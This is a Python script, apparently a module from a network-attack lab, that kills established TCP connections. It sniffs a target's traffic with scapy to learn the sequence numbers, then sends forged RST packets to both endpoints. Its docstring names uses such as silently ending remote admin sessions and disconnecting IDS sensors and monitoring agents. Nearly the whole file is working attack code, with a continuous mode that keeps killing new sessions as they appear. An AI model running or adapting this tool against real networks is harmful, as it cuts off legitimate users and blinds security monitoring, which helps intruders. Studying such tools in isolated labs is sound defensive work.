#!/usr/bin/env python3
"""
Module 4 — TCP RST Injector

Kills an established TCP connection by sending forged RST packets
to both endpoints. Does NOT require ARP poisoning — works by
sniffing traffic to find the current sequence numbers.

Use case: silently kill a connection (e.g., kill a remote admin
session, disrupt a monitoring agent's TCP stream, disconnect
an IDS sensor from its manager).

Requires: root privileges, visibility to the target traffic
(attacker must be on path, or use with ARP MitM from module3).

Usage:
  sudo python3 module4/rst_injector.py --target 192.168.56.2 --port 22
  sudo python3 module4/rst_injector.py --target 192.168.56.2 --port 23 --continuous
"""

import argparse
import sys
import threading

from scapy.all import (
    IP, TCP,
    send, sniff, AsyncSniffer,
    conf,
)

conf.verb = 0
conf.iface = conf.route.route("192.168.56.0")[0]  # default to isolated lab NIC (not Vagrant NAT)

killed_sessions: set = set()
stop_event = threading.Event()


def build_rst(src_ip, src_port, dst_ip, dst_port, seq):
    """Build a RST packet spoofed as `src` to kill its side of the session."""
    return IP(src=src_ip, dst=dst_ip) / TCP(
        sport=src_port,
        dport=dst_port,
        flags="R",
        seq=seq,
    )


def kill_session(pkt, bidirectional: bool = True):
    """
    Called when we observe a TCP packet with data or SYN-ACK.
    Injects RST to both endpoints using the current seq/ack numbers.
    """
    if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
        return

    tcp = pkt[TCP]
    ip  = pkt[IP]

    # Only target established sessions (not SYN or RST/FIN packets)
    if tcp.flags & 0x04:   # RST — already dead
        return
    if tcp.flags & 0x02 and not (tcp.flags & 0x10):   # bare SYN — not established yet
        return

    session_id = tuple(sorted([(ip.src, tcp.sport), (ip.dst, tcp.dport)]))
    if session_id in killed_sessions:
        return

    print(f"  [*] Found session: {ip.src}:{tcp.sport} <-> {ip.dst}:{tcp.dport}")
    print(f"       seq={tcp.seq}  ack={tcp.ack}  flags={tcp.flags}")

    # RST to the destination (kill the receiver's side)
    rst_to_dst = build_rst(ip.src, tcp.sport, ip.dst, tcp.dport, seq=tcp.seq)

    pkts = [rst_to_dst]

    if bidirectional:
        # RST to the source (kill the sender's side)
        rst_to_src = build_rst(ip.dst, tcp.dport, ip.src, tcp.sport, seq=tcp.ack)
        pkts.append(rst_to_src)

    send(pkts, verbose=False)
    killed_sessions.add(session_id)

    direction = "bidirectional" if bidirectional else "one-way"
    print(f"  [+] RST injected ({direction}) — session killed")


def main():
    parser = argparse.ArgumentParser(description="TCP RST connection killer")
    parser.add_argument("--target",  required=True, help="IP address to watch for TCP sessions")
    parser.add_argument("--port",    type=int, default=0,
                        help="Filter by port (0 = any port)")
    parser.add_argument("--iface",   default=conf.iface)
    parser.add_argument("--one-way", action="store_true",
                        help="Send RST only to destination, not back to source")
    parser.add_argument("--continuous", action="store_true",
                        help="Keep running and kill new sessions as they appear")
    args = parser.parse_args()

    bpf = f"tcp and host {args.target}"
    if args.port:
        bpf += f" and port {args.port}"

    bidirectional = not args.one_way

    print(f"[*] TCP RST Injector")
    print(f"    Target:     {args.target}")
    print(f"    Port filter: {args.port or 'any'}")
    print(f"    Mode:       {'continuous' if args.continuous else 'single session'}")
    print(f"    BPF filter: {bpf}\n")

    def callback(pkt):
        kill_session(pkt, bidirectional=bidirectional)
        if not args.continuous:
            stop_event.set()

    sniffer = AsyncSniffer(
        iface=args.iface,
        filter=bpf,
        prn=callback,
        store=False,
    )
    sniffer.start()
    print("[*] Sniffing for TCP sessions... (Ctrl-C to stop)\n")

    try:
        if args.continuous:
            stop_event.wait()   # wait until KeyboardInterrupt
        else:
            stop_event.wait(timeout=60)
            if not stop_event.is_set():
                print("[-] Timeout: no eligible TCP session observed in 60 seconds")
    except KeyboardInterrupt:
        pass
    finally:
        sniffer.stop()
        print(f"\n[*] Total sessions killed: {len(killed_sessions)}")


if __name__ == "__main__":
    main()
